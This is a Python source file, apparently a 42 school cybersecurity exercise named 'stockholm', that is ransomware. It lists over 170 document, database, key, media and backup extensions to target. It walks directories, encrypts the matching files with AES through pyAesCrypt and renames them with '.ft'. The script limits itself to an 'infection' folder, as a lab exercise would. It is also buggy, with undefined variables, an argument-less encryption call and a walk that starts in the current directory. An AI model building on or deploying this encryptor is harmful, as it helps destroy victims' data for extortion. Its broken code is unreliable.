# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: tvillare <tvillare@student.42madrid.com    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/18 18:07:39 by tvillare          #+#    #+#              #
#    Updated: 2023/05/19 13:34:46 by tvillare         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import sys
import os
import re
import hashlib
import argparse
import struct
import time
import platform
import pyAesCrypt
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


exet = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf',
		'.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf',
		'.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx',
		'.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt',
		'.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']

exet_ft = [".ft",]
# Tamaño del búfer de cifrado/descifrado (en bytes)
buffer_size = 64 * 1024

# Cifrado de un archivo
def cifrar_archivo(input, clave):
	output = input + ".ft"
	pyAesCrypt.encryptFile(input, output, clave, buffer_size)

# Descifrado de un archivo cifrado
def descifrar_archivo(input, clave):
	output = inputcadena.rstrip(".ft")
	pyAesCrypt.decryptFile(input, output, clave, buffer_size)


def get_passwd():
	secret = input("Introduce la contraeña: ")
	if (len(secret) < 16):
		print("Contraseña muy corta")
		sys.exit()
	passwd = hashlib.sha256(secret.encode('utf-8')).digest()
	return passwd

def	get_files(ruta_carpeta):
	# Obtener la lista de archivos y directorios en la carpeta
	elementos = os.listdir(ruta_carpeta)
	# Recorrer y mostrar los nombres de los archivos y directorios
	for elemento in elementos:
		ruta_elemento = os.path.join(ruta_carpeta, elemento)
		if os.path.isdir(ruta_elemento):
			#print(f'Directorio: {elemento}')
			get_files(ruta_elemento)

		elif any(elemento.endswith(extension) for extension in exet):
		#elif  re.search(patron, elemento, re.IGNORECASE):
			files.append(ruta_elemento)

			#print(f'Archivo: {elemento}')

def	get_home():
	if platform.system() == 'Windows': #Conprobar que funciona
		print("Estás en un sistema Windows.")
		home_drive = os.environ.get('HOMEDRIVE', '')
		home_path = os.environ.get('HOMEPATH', '')
		home = os.path.join(home_drive, home_path)
		print(home_directory)
	elif platform.system() == 'Linux' or platform.system() == "Darwin":
		home = os.environ['HOME']
	if os.path.isdir(home + "/infection"):
		return(home + "/infection")
	else:
		print("NO Existe la carpeta infection en HOME o no es valida")
		sys.exit()



files = []
#passwd = get_passwd()
cifrar_archivo()
home = get_home()
print(home)
get_files("./")
for i in files:
	print("file -> ", i)

